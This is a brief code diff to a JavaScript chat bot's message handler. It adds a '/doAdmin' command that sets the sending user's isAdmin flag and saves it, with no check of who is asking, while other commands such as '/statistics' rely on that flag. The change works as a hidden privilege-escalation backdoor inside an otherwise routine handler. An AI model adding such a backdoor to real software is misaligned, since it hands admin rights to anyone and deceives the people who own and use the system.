@@ -246,6 +246,10 @@ function init(bot) {
             console.log(await getState(latitude, longitude));
         }
 
+        if (content === "/doAdmin") {
+            user.isAdmin = true;
+            await user.save();
+        }
         if (content === "/menu") await sendMenu(chatId, bot, user);
 
         if (content === "/statistics" && user.isAdmin) {
